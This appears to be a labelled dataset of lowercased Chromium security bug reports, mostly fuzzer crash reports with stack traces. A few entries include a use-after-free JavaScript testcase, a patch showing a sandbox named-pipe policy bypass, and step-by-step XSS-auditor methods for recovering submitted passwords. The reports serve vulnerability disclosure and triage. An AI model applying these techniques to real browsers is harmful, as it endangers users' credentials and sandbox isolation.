heap-use-after-free in webcore channelprovider provideinput detailed report fuzzer attekett_webaudio_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore channelprovider provideinput webcore sincresampler consumesource free stack webcore htmlmediaelement clearmediaplayer webcore htmlmediaelement usercancelledload fully reproducible crash found using linux_tsan_chrome_mp job type history_size=6 additional requirements requires interaction gestures	11
assertion failed width framerect.width unknown in webcore webpimagedecoder applypostprocessing detailed report fuzzer noel-image-flip job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack webcore webpimagedecoder applypostprocessing webcore webpimagedecoder decode webcore webpimagedecoder framebufferatindex regressed minimized testcase 1.93 kb	11
security crash in aura window notifywindowhierarchychangeatreceiver version google chrome canary version 33.0.1708.0 canary os window 7 steps youtube video or 1 launch the browser 2 open poc.html and click on the page anywhere on the page the you gon na see there is print and speech api on the page 3 open a new-tab 4 back to the page poc.html then click on cancel button which is on print then click again on the page and you gon na see same things print and speech api 5 then close that new-tab 6 crash eax=08845660 ebx=00000000 ecx=08845660 edx=f8500156 esi=01225140 edi=04c94b40 eip=5f1d8c07 esp=001cf0a4 ebp=001cf0d0 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_5efd0000 aura window notifywindowhierarchychangeatreceiver 5f1d8c07 ff12 call dword ptr edx ds:0023 f8500156 0:000 k childebp retaddr 001cf0d0 5f1d92c4 chrome_5efd0000 aura window notifywindowhierarchychangeatreceiver c b\build\slave\win\build\src\ui\aura\window.cc 1078 001cf0e0 5f1d8b42 chrome_5efd0000 aura window notifywindowhierarchychangeup c b\build\slave\win\build\src\ui\aura\window.cc 1067 001cf0f4 5f327dc4 chrome_5efd0000 aura window notifywindowhierarchychange c b\build\slave\win\build\src\ui\aura\window.cc 1043 001cf11c 5f327aa3 chrome_5efd0000 aura window removechild c b\build\slave\win\build\src\ui\aura\window.cc 408 001cf158 5f3279d5 chrome_5efd0000 aura window window c b\build\slave\win\build\src\ui\aura\window.cc 129 001cf164 5f3279c9 chrome_5efd0000 aura window scalar deleting destructor 001cf16c 5f32ff8e chrome_5efd0000 content renderwidgethostviewaura destroy c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_view_aura.cc 969 001cf184 5f32ff42 chrome_5efd0000 content renderwidgethostimpl destroy c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_impl.cc 1378 001cf194 5f32fdf5 chrome_5efd0000 content renderwidgethostimpl shutdown c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_impl.cc 431 001cf19c 5f32c947 chrome_5efd0000 content renderviewhostmanager renderviewhostmanager c b\build\slave\win\build\src\content\browser\frame_host\render_view_host_manager.cc 80 001cf1c8 5f32c695 chrome_5efd0000 content webcontentsimpl webcontentsimpl c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 431 001cf1d4 5f32c141 chrome_5efd0000 content webcontentsimpl scalar deleting destructor 001cf1f8 5f32bed4 chrome_5efd0000 tabstripmodel internalclosetab c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1264 001cf23c 5fc3d65f chrome_5efd0000 tabstripmodel internalclosetabs c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1248 001cf268 5fd0022e chrome_5efd0000 tabstripmodel closewebcontentsat c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 556 001cf27c 5fcc66c8 chrome_5efd0000 browsertabstripcontroller closetab c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\browser_tab_strip_controller.cc 289 001cf29c 5fcc97f3 chrome_5efd0000 tabstrip closetab c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\tab_strip.cc 1034 001cf2b4 5f834b40 chrome_5efd0000 tab buttonpressed c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\tab.cc 729 001cf2c4 5f834785 chrome_5efd0000 views button notifyclick c b\build\slave\win\build\src\ui\views\controls\button\button.cc 59 001cf2e0 5fcc8198 chrome_5efd0000 views custombutton onmousereleased c b\build\slave\win\build\src\ui\views\controls\button\custom_button.cc 131	11
tracking bug for internal security fixes for chrome 32 release 0 high medium low	11
unknown in webcore computeshapepaddingbounds detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free read 4 crash address crash state crash stack webcore computeshapepaddingbounds webcore polygonshape shapepaddingbounds free stack webcore renderwordbreak scalar deleting destructor webcore renderobject postdestroy	11
security bad cast in torenderwidgethostviewaura in web_contents_view_aura.cc in i tried to enable webviewtest.interstitialteardown on windows to verify that my refactoring in that test worked i was able to verify that the refactoring worked however i hit a bug it looks like the torenderwidgethostviewaura in web_contents_view_aura.cc assumes that if renderprocesshost isguest returns false it can static_cast a renderwidgethostview to a renderwidgethostviewaura however in that test it hits one code path where the renderwidgethostview is a renderwidgethostviewguest however renderprocesshost isguest returns false so the renderwidgethostviewguest is casted to a renderwidgethostviewaura and hilarity ensues while the particular callstack that i hit below is only possible on windows i do n't know what other code paths in that file which use the torenderwidgethostviewaura also hit this condition and which we have no or disabled tests i.e it may not be just a windows bug content.dll content renderwidgethostviewguest renderwidgethostviewguest content renderwidgethost widget_host content browserpluginguest guest content renderwidgethostview platform_view line 59 c content.dll content webcontentsviewguest createviewforwidget content renderwidgethost render_widget_host line 135 bytes c content.dll content webcontentsimpl createrenderviewforrendermanager content renderviewhost render_view_host int opener_route_id line 3535 bytes c content.dll content renderviewhostmanager initrenderview content renderviewhost render_view_host int opener_route_id line 766 bytes c content.dll content renderviewhostmanager createrenderview content siteinstance instance int opener_route_id bool swapped_out bool hidden line 742 bytes c content.dll content webcontentsimpl createswappedoutrenderview content siteinstance instance line 3347 c content.dll content browserpluginguest initialize content webcontentsimpl embedder_web_contents const browserpluginhostmsg_attach_params params line 589 bytes c content.dll content browserpluginembedder onattach int instance_id const browserpluginhostmsg_attach_params params const base dictionaryvalue extra_params line 208 c content.dll dispatchtomethod content browserpluginembedder void thiscall content browserpluginembedder int browserpluginhostmsg_attach_params const base dictionaryvalue const int browserpluginhostmsg_attach_params base dictionaryvalue content browserpluginembedder obj void int const browserpluginhostmsg_attach_params const base dictionaryvalue method const tuple3 int browserpluginhostmsg_attach_params base dictionaryvalue arg line 564 bytes c content.dll browserpluginhostmsg_attach dispatch content browserpluginembedder content browserpluginembedder void thiscall content browserpluginembedder int browserpluginhostmsg_attach_params const base dictionaryvalue const const ipc message msg content browserpluginembedder obj content browserpluginembedder sender void int const browserpluginhostmsg_attach_params const base dictionaryvalue func line 172 bytes c content.dll content browserpluginembedder onmessagereceived const ipc message message line 102 bytes c content.dll content webcontentsimpl onmessagereceived content renderviewhost render_view_host const ipc message message line 480 bytes c content.dll content renderviewhostimpl onmessagereceived const ipc message msg line 1158 bytes c content.dll content renderprocesshostimpl onmessagereceived const ipc message msg line 1306 bytes c ipc.dll ipc channelproxy context ondispatchmessage const ipc message message line 260 bytes c ipc.dll base internal runnableadapter void thiscall ipc channelproxy context ipc message const run ipc channelproxy context object const ipc message a1 line 190 bytes c ipc.dll base internal invokehelper 0 void base internal runnableadapter void thiscall ipc channelproxy context ipc message const void cdecl ipc channelproxy context const ipc message const makeitso base internal runnableadapter void thiscall ipc channelproxy context ipc message const runnable ipc channelproxy context const a1 const ipc message a2 line 899 c ipc.dll base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall ipc channelproxy context ipc message const void cdecl ipc channelproxy context ipc message const void cdecl ipc channelproxy context ipc message void cdecl ipc channelproxy context ipc message const run base internal bindstatebase base line 1253 bytes c base.dll base callback void cdecl void run line 396 bytes c base.dll base messageloop runtask const base pendingtask pending_task line 493 c base.dll base messageloop deferorrunpendingtask const base pendingtask pending_task line 506 c base.dll base messageloop dowork line 617 bytes c base.dll base messagepumpforui dorunloop line 243 bytes c base.dll base messagepumpwin runwithdispatcher base messagepump delegate delegate base messagepumpdispatcher dispatcher line 65 bytes c base.dll base messagepumpwin run base messagepump delegate delegate line 48 bytes c base.dll base messageloop runinternal line 441 bytes c base.dll base messageloop runhandler line 414 c base.dll base runloop run line 48 c browser_tests.exe content runthisrunloop base runloop run_loop line 100 bytes c browser_tests.exe content messagelooprunner run line 164 bytes c browser_tests.exe anonymous namespace guestcontentbrowserclient waitforguestcreated line 84 c browser_tests.exe webviewtest_interstitialteardown_test runtestonmainthread line 1060 bytes c	11
clipboard.cc issues ui/base/clipboard/clipboard.cc is not doing good since the latest pwn2own here s more issues isbitmapsafe does const gfx size size reinterpret_cast const gfx size params 1 front jln already noted in issue 319125 23 that this ca n't be good sure enough it is bypassing the sanity checks of gfx size that width and height are n't negative clipboard replacesharedmemhandle does ui thread see dispatchobject iter second 0 clear for size_t i 0 i sizeof sharedmemory i iter second 0 push_back reinterpret_cast char bitmap i where second is a std vector received over ipc second 0 is out-of-bounds when the vector is empty	11
multiprofile screen does not lock when non-corp account is active chrome version 32.0.1700.26 beta chrome os version 4920.19.0 chrome os platform pixel steps to reproduce 1 enable desktop-per-account multiprofile 2 sign in with corp acct 3 add personal account to session 4 while using personal account close device 5 open device expected result lock screen as per corp enterprise policy actual result no lock screen how frequently does this problem reproduce always what is the impact to the user and is there a workaround if so what is it the impact is that a thief can get at my corp account without needing my password it does lock when i m using my corp desktop so the workaround is to always switch back to that before suspending but that is unrealistic report/1533361289 context=ri	11
heap-use-after-free in extensions extensionapi splitdependencyname detailed report fuzzer meacer_extension_apis job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack extensions extensionapi splitdependencyname extensions extensionapi getfeaturedependency free stack std rb_tree std string std string std identity std string std less std string std al extensions feature feature fully reproducible crash found using linux_tsan_chrome_mp job type history_size=6	11
assertion failed m_context document documentelement m_context heap-use-after-free in webcore svgtransformv8internal angleattributegettercallback detailed report fuzzer lcamtuf_cross_fuzz job type linux_asan_chrome_mp crash type heap-use-after-free read 4 crash address crash state crash stack webcore svgtransformv8internal angleattributegettercallback v8 internal propertycallbackarguments call free stack webcore svggraphicselement svggraphicselement webcore svgdefselement svgdefselement regressed minimized testcase 4.54 kb	11
security crash in aura window notifywindowhierarchychangeatreceiver version google chrome canary version 33.0.1708.0 canary os window 7 steps youtube video or 1 launch the browser 2 open poc.html and click on the page anywhere on the page the you gon na see there is print and speech api on the page 3 open a new-tab 4 back to the page poc.html then click on cancel button which is on print then click again on the page and you gon na see same things print and speech api 5 then close that new-tab 6 crash eax=08845660 ebx=00000000 ecx=08845660 edx=f8500156 esi=01225140 edi=04c94b40 eip=5f1d8c07 esp=001cf0a4 ebp=001cf0d0 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_5efd0000 aura window notifywindowhierarchychangeatreceiver 5f1d8c07 ff12 call dword ptr edx ds:0023 f8500156 0:000 k childebp retaddr 001cf0d0 5f1d92c4 chrome_5efd0000 aura window notifywindowhierarchychangeatreceiver c b\build\slave\win\build\src\ui\aura\window.cc 1078 001cf0e0 5f1d8b42 chrome_5efd0000 aura window notifywindowhierarchychangeup c b\build\slave\win\build\src\ui\aura\window.cc 1067 001cf0f4 5f327dc4 chrome_5efd0000 aura window notifywindowhierarchychange c b\build\slave\win\build\src\ui\aura\window.cc 1043 001cf11c 5f327aa3 chrome_5efd0000 aura window removechild c b\build\slave\win\build\src\ui\aura\window.cc 408 001cf158 5f3279d5 chrome_5efd0000 aura window window c b\build\slave\win\build\src\ui\aura\window.cc 129 001cf164 5f3279c9 chrome_5efd0000 aura window scalar deleting destructor 001cf16c 5f32ff8e chrome_5efd0000 content renderwidgethostviewaura destroy c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_view_aura.cc 969 001cf184 5f32ff42 chrome_5efd0000 content renderwidgethostimpl destroy c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_impl.cc 1378 001cf194 5f32fdf5 chrome_5efd0000 content renderwidgethostimpl shutdown c b\build\slave\win\build\src\content\browser\renderer_host\render_widget_host_impl.cc 431 001cf19c 5f32c947 chrome_5efd0000 content renderviewhostmanager renderviewhostmanager c b\build\slave\win\build\src\content\browser\frame_host\render_view_host_manager.cc 80 001cf1c8 5f32c695 chrome_5efd0000 content webcontentsimpl webcontentsimpl c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 431 001cf1d4 5f32c141 chrome_5efd0000 content webcontentsimpl scalar deleting destructor 001cf1f8 5f32bed4 chrome_5efd0000 tabstripmodel internalclosetab c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1264 001cf23c 5fc3d65f chrome_5efd0000 tabstripmodel internalclosetabs c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1248 001cf268 5fd0022e chrome_5efd0000 tabstripmodel closewebcontentsat c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 556 001cf27c 5fcc66c8 chrome_5efd0000 browsertabstripcontroller closetab c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\browser_tab_strip_controller.cc 289 001cf29c 5fcc97f3 chrome_5efd0000 tabstrip closetab c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\tab_strip.cc 1034 001cf2b4 5f834b40 chrome_5efd0000 tab buttonpressed c b\build\slave\win\build\src\chrome\browser\ui\views\tabs\tab.cc 729 001cf2c4 5f834785 chrome_5efd0000 views button notifyclick c b\build\slave\win\build\src\ui\views\controls\button\button.cc 59 001cf2e0 5fcc8198 chrome_5efd0000 views custombutton onmousereleased c b\build\slave\win\build\src\ui\views\controls\button\custom_button.cc 131	11
crash when opening a browser action popup when another browser action popup is visible crash on win aura canary chrome version 33.0.1710.0 official build 235245 canary what steps will reproduce the problem 1 install two extensions with browser action popups e.g and 2 click one of the browser actions to open its popup 3 while it s open click the other browser action to open its popup what is the expected result first popup closes second popup opens what happens instead the first popup starts to go away and the browser crashes	11
security shared websql worker races cause invalid pointers in databaseobserver databaseclosed and databaseobserver reportopendatabaseresult vulnerability details chrome crashes in databaseobserver databaseclosed and databaseobserver reportopendatabaseresult with an invalid pointer when multiple random name databases are opened while the script reloads continuously from multiple shared workers onmessage events many other trivial 0-ptr crashes like chromiumopen chromiumaccess and chromiumdelete can occur all seem to be caused by worker races it is also possible that the script causes an invalid handle stack corruption while reloading the worker process without a debugger this can probably happen unnoticed version chrome version 27.0.1453.110 stable 29.0.1538.0 continuous trace operating system windows xp sp3 7 sp1 reproduction case launch the added script for crashes please include the following additional information type of crash worker crash state see added stack trace files	11
assertion failed m_statestack.size 1 heap-use-after-free in webcore scrollview paint tested on os ubuntu 12.04 chromium asan 33.0.1738.0 developer build 240534 repro-file as attachment note the file content is actually a svg-file but you have to have file-extension html to reproduce the issue if you rename the file with svg extension chrome only reports syntax-error when the file is opened asan-report 8060==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in webcore graphicscontext paintingdisabled const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.h:88:0 1 in webcore scrollview paint webcore graphicscontext webcore intrect const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/scroll/scrollview.cpp:878:0 2 in webcore svgimage draw webcore graphicscontext webcore floatrect const webcore floatrect const webcore compositeoperator blink webblendmode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/graphics/svgimage.cpp:264:0 3 in webcore graphicscontext drawimage webcore image webcore floatrect const webcore floatrect const webcore compositeoperator blink webblendmode webcore respectimageorientationenum bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.cpp:1107:0 4 in webcore graphicscontext drawimage webcore image webcore floatrect const webcore floatrect const webcore compositeoperator webcore respectimageorientationenum bool b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/graphicscontext.cpp:1086:0 5 in webcore rendersvgimage paintforeground webcore paintinfo b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/svg/rendersvgimage.cpp:171:0 is located 0 bytes inside of 592-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl_:0 1 in wtf ownptr webcore graphicscontext ownptr b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/ownptr.h:62:0 2 in webcore imagebuffer imagebuffer b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/imagebuffer.cpp:87:0 3 in wtf ownedptrdeleter webcore imagebuffer deleteptr webcore imagebuffer b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52:0 4 in webcore rendersvgimage imagechanged void webcore intrect const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/svg/rendersvgimage.cpp:219:0 5 in webcore imageresource notifyobservers webcore intrect const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/fetch/imageresource.cpp:270:0	11
langfuzz crash at v8 internal storebuffer compact with invalid write useragent mozilla/5.0 x11 linux x86_64 rv:28.0 gecko/20100101 firefox/28.0 steps to reproduce the problem 1 run the following js code in d8 as used in the specified chrome version svn r18421 branch 3.23 64 bit function boom var args for var i 0 i 125000 i args.push i return array.apply array args var array boom function fib n var f0 0 f1 1 for n 0 n n 1 f0 f1 f0 array fib 75 what is the expected behavior no crash what went wrong d8 crashes with a gc corruption 15142 invalid write of size 8 15142 at v8 internal storebuffer compact in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector migrateobject unsigned char unsigned char int v8 internal allocationspace in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector discoverandpromoteblackobjectsonpage v8 internal newspace v8 internal newspacepage in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector evacuatenewspace in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector evacuatenewspaceandcandidates in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector sweepspaces in 3.23/out/x64.release/d8 15142 by v8 internal markcompactcollector collectgarbage in 3.23/out/x64.release/d8 15142 by v8 internal heap performgarbagecollection v8 internal garbagecollector v8 internal gctracer in 3.23/out/x64.release/d8 15142 by v8 internal heap collectgarbage v8 internal allocationspace v8 internal garbagecollector char const char const in 3.23/out/x64.release/d8 15142 by v8 internal jsobject setfastelementscapacityandlength v8 internal handle v8 internal jsobject int int v8 internal jsobject setfastelementscapacitysmimode in 3.23/out/x64.release/d8 15142 by v8 internal jsobject setdictionaryelement v8 internal handle v8 internal jsobject unsigned int v8 internal handle v8 internal object propertyattributes v8 internal strictmodeflag bool v8 internal setpropertymode in 3.23/out/x64.release/d8 15142 by v8 internal jsobject setelementwithoutinterceptor v8 internal handle v8 internal jsobject unsigned int v8 internal handle v8 internal object propertyattributes v8 internal strictmodeflag bool v8 internal setpropertymode in 3.23/out/x64.release/d8 15142 address is not stack d malloc d or recently free d i was not able to reproduce this properly in my release build of chromium but i suspect this is due to different gc timings and with a little effort this could be solved a test for d8 is also likely to be more valuable to find the actual problem did this work before yes v8 branch 3.22 seems to work fine chrome version 33.0.1750.5 channel dev os version ubuntu linux 12.04 lts flash version shockwave flash 11.2 r202 in branch 3.22 i get this weird error test.js:3 illegal access for var i 0 i 125000 i instead of a crash	9
security windows sandbox named pipe policy does n't block relative paths vulnerability details every sandboxed process on windows has a default policy to create named pipes with a chrome.nacl or chrome.sync prefixes this is done through the broker for example the code in addgenericpolicy is result policy addrule sandbox targetpolicy subsys_named_pipes sandbox targetpolicy namedpipes_allow_any l pipe\\chrome.nacl if result sandbox sbox_all_ok return false this should only allow named pipes with a chrome.nacl prefix however it does n't as createnamedpipe will canonicalize the pipe path it seems counter intuitive if it starts with the prefix so for example call the broker passing it pipe\chrome.nacl abc and you will create a named pipe called abc outside of the chrome namespace this could be fixed in a number of ways the least impact would be to pre-canonicalize the path before evaluating the policy in namedpipedispatcher createnamedpipe alternatively you could require the path be the form pipe which will not get canonicalized the correct way is probably to hook ntcreatenamedpipefile instead this is an exploitable condition for various different reasons while this only opens the server side of a pipe you should be able to impersonate chrome named pipes although would n't be trivial to guess the random values you could also create a server instance of any multi-use pipe in the user s session and use that reference to change the dacl of the pipe by requesting write_dac permissions once the dacl has been modified you should be able to open it directly from the sandboxed process and potentially escape the sandbox version chromium version 34.0.1784.0 dev from svn/git operating system windows 7 sp1 x64 reproduction case apply the following patch src/content/renderer/renderer_main.cc.orig 2014-01-16 00:50:07.609924900 0000 src/content/renderer/renderer_main.cc 2014-01-16 00:49:35.423083900 0000 233,6 233,26 new renderthreadimpl endif handle hpipe createnamedpipew l pipe\\chrome.nacl.a this_shouldn't_work pipe_access_duplex write_dac read/write access pipe_type_message message type pipe pipe_readmode_message message-read mode pipe_wait blocking mode pipe_unlimited_instances max instances 512 output buffer size 512 input buffer size 0 client time-out null default security attribute if hpipe invalid_handle_value log error created pipe bad else log error l failed to create pipe good base highresolutiontimermanager hi_res_timer_manager platform.runsandboxtests no_sandbox this will try and create a named pipe called this_shouldn't_work for every new renderer if it was successful in creating the pipe you should get an appropriate log message you can also see the new pipe by looking at handle view in process explorer or process hacker	6
security use-after-free in content webcontentsimpl webcontentsimpl this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details version chrome version stable 31.0.1650.63 m operating system window 7 reproduction case actually is not easy to repro this crash cause can take several tries to repro so you should click on page many clicks and faster as much as possible you can see the screenshot for crashes please include the following additional information type of crash browser client id if relevant 2d7d33b5cdde3482 82e09d0806a93a6d crash state eax=f5105786 ebx=00000000 ecx=0ae00650 edx=00011d3f esi=0b436000 edi=00000001 eip=60fd6eb4 esp=0026ed50 ebp=0026ed78 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206 chrome_60c90000 content webcontentsimpl webcontentsimpl 60fd6eb4 ff10 call dword ptr eax ds:0023 f5105786 0:000 k childebp retaddr 0026ed78 60fd6ce3 chrome_60c90000 content webcontentsimpl webcontentsimpl c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 422 0026ed84 60fd678f chrome_60c90000 content webcontentsimpl scalar deleting destructor 0026eda8 60fd65db chrome_60c90000 tabstripmodel internalclosetab c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1160 0026edfc 6184a83a chrome_60c90000 tabstripmodel internalclosetabs c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 1144 0026ee28 6184998a chrome_60c90000 tabstripmodel closewebcontentsat c b\build\slave\win\build\src\chrome\browser\ui\tabs\tab_strip_model.cc 427 0026ee40 618486e5 chrome_60c90000 chrome closewebcontents c b\build\slave\win\build\src\chrome\browser\ui\browser_tabstrip.cc 82 0026ee58 61958f3e chrome_60c90000 browser closecontents c b\build\slave\win\build\src\chrome\browser\ui\browser.cc 1386 0026ee6c 61954645 chrome_60c90000 content webcontentsimpl close c b\build\slave\win\build\src\content\browser\web_contents\web_contents_impl.cc 3242 0026ee78 60f2d70d chrome_60c90000 content renderviewhostimpl closepageignoringunloadevents c b\build\slave\win\build\src\content\browser\renderer_host\render_view_host_impl.cc 554 0026f22c 60f2d578 chrome_60c90000 content renderviewhostimpl onmessagereceived c b\build\slave\win\build\src\content\browser\renderer_host\render_view_host_impl.cc 949 0026f354 60f2d2c5 chrome_60c90000 content renderprocesshostimpl onmessagereceived c b\build\slave\win\build\src\content\browser\renderer_host\render_process_host_impl.cc 1282 0026f384 60d49fba chrome_60c90000 ipc channelproxy context ondispatchmessage c b\build\slave\win\build\src\ipc\ipc_channel_proxy.cc 270 0026f394 60ce13e9 chrome_60c90000 base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall predictors loggedinpredictortable gurl const void cdecl predictors loggedinpredictortable gurl const void cdecl scoped_refptr predictors loggedinpredictortable gurl void cdecl predictors loggedinpredictortable gurl const run c b\build\slave\win\build\src\base\bind_internal.h 1253 0026f408 60ce0dd9 chrome_60c90000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 493 0026f558 60d5d1cd chrome_60c90000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 618 0026f588 60ce08cc chrome_60c90000 base messagepumpforui dorunloop c b\build\slave\win\build\src\base\message_loop\message_pump_win.cc 243 0026f5a8 60ce0837 chrome_60c90000 base messageloop runinternal c b\build\slave\win\build\src\base\message_loop\message_loop.cc 436 0026f5b8 60f149b5 chrome_60c90000 base runloop run c b\build\slave\win\build\src\base\run_loop.cc 48 0026f630 60f1489e chrome_60c90000 chromebrowsermainparts mainmessagelooprun c b\build\slave\win\build\src\chrome\browser\chrome_browser_main.cc 1588 0026f644 60f14868 chrome_60c90000 content browsermainloop runmainmessageloopparts c b\build\slave\win\build\src\content\browser\browser_main_loop.cc 695	11
heap-use-after-free in webcore document updatelayout vulnerability details the following testcase crashes the latest chrome asan build version chrome version asan-symbolized-linux-release-223354 operating system linux 64-bit reproduction case script function start o0=document.documentelement o125=o0.clonenode true o0.appendchild o125 o151=document.documentelement while o151.parentnode o151=o151.parentnode o151.addeventlistener overflowchanged cb_event_overflowchanged_393_1 true document.documentelement.offsetheight for var xrn=0 xrn o151.childnodes.length xrn o151.removechild o151.childnodes xrn o747=document.createelement iframe o761=document.createrange o761.surroundcontents o747 o762=o747.contentwindow.document o762.execcommand stylewithcss false false function cb_event_overflowchanged_393_1 o747.parentnode.removechild o747 window.settimeout start 100 script for crashes please include the following additional information type of crash tab crash state see attached stack.txt for asan output	11
security body of post request initiated 302-redirect chain can be recovered by script on last page in chain using xss auditor this issue is not xss auditor bypass vulnerability details when a post request initiates a chain of 302 redirects xssauditor for last first non-302 page is initialized using url of last page and post body of first initial request if attacker controls that last page he can use char-by-char bruting to recover post body of initial request in linear time more detailed 1 attacker asks user to login using victim.com for example 2 in typical case user will be redirected back to attacker s site after login so for example if user password is submitted to login.html sequense of requests and responces could be like that post 302 redirect to get 302 redirect to get 200 ok 3 if attacker added script to this last return url on step 1 xss auditor will try to detect xss in script tags xss auditor s init is called with post body from request to login.html but filters document controlled by attacker attacker could add script tag with document.write and see if it is filtered xss auditor checks if script tag contents is contained in request so attacker could be trying add one char to already bruted part and recover full request body char-by-char in linear time this issue and issue 331060 are completely different in how to achive xss auditor initialized for attacker controlled page using body of request to another domain but are absolutely identical in method of recovering post body after that i do n't know if this issue is security issue as section-7.3 allows request body be repeated to attacker in the example above but i m sure i have seen in the debugger that xss auditor s init is called with request body containing my facebook password for filtering page on other site that that asked me to login with my facebook account version chrome version both stable and beta seems to be affected operating system tested on linux reproduction case i ve made simple redirecting after login webserver victim_server.py and i use body-recovering code i ve posted in issue 331060 in attacker_redirect.html for reproducting follow these steps 1 python victim_server.py 2 make attacker_redirect.html accessible through http not file as we want allow victim redirect back to it 3 open in chromium 4 click login using victim 5 enter your password on victim site it could be any a-z string and press submit 6 see alert from attacker containing string you entered	6
security xss auditor behavior can cause leak of submitted form data because of about blank redirection vulnerability details when xss auditor detects xss in form action attribute it changes it to about blank attacker can add bogus parameters to make sensitive information submitted to about blank after that xss auditor under some conditions will allow to brute request body char-by-char by adding script with some content to that about blank page and see if it is blocked more detailed assume there are two sites attacker.com and victim.com user agrees to send sensitive information to the victim.com but not to the attacker assume this information is user s password from his victim.com account attacker can perform following steps to get the password 1 assume user is browsing attacker.com when user clicks on link login using your victim.com account attacker performs window.open in the new window he makes post request using form to the victim.com login page with bogus parameter which value is kind of action='/login which is extracted from victim s source before attack and is victim.com login form action if victim.com rejects post at this page attacker can use get too but it will be seen in location bar that there is strange url parameter 2 user sees victim.com url at location bar and enters his password what he does n't see is that xss auditor filtered action of login form and set it to about blank when user submits form info is submited to about blank assume login form used post 3 attacker can now access about blank and run there his scripts if he do so xss auditor will use attacker s url and request body sent by victim.com for initialization if attacker add somethink like a script to his own url before doing step 1 xss auditor will search every script s content snippet if it is substring of request body another condition for this is that request body must contain at least one of symbols we ll discuss this below 4 now attacker starts to make script tags and see if they are filtered assume attacker has already got string s which is contained in request body he can now create script tags using document write with such contents as sa sb sc sz if s is followed by one of a z in request body and so in user s password then one of this script will be filtered and others will not so attacker knows new character of s in constant time without any network requests and he can brute the whole password or request body char-by-char here is again list of preconditions is needed to attack 1 victim.com is using post for submitting login form does n't set x-xss-protection common case 2 login form is submitted to some page different from page where it is shown so that there is explicit action parameter in login form common case again 3 one of is contained in login request that is the hardest precondition the reason for it is that if none of that is contained in request body xss auditor will completely ignore it well if victim uses multipart/form-data there will be a lot of double quotes i think that there could be come encoding issues also because xss auditor will use attacker s document encoding for decode request body version chrome version both stable and beta seems to be vulnerable operating system i used linux version to perform tests reproduction case attacker.html is example for attacker page located on attacker.com and victim.html is example for victim s login form i use multipart/form-data for demo but there could be other ways to set up one of that characters into the request body you need to set up victim s url in attacker.html before you start reproduction and you need to have attacker and victim in different origins i ve tried really hard to make the poc both minimal and showing full issue and there are a lot of comments there but attacker.html still has 65 lines i do n't think it is too hard to understand what it does i think it could be minimal repro for such a complex attack	5
heap-use-after-free in webcore renderlayerscrollablearea updatecompositinglayersafterscroll vulnerability details the attached testcase crashes the latest chrome asan build unfortunately it is a little unreliable to reproduce i had good results with 20 tabs version chrome version asan-symbolized-linux-release-236536 operating system linux 64-bit reproduction case attached in crash.html requires svgx.svg for crashes please include the following additional information type of crash tab crash state asan output attached in stack.txt	11
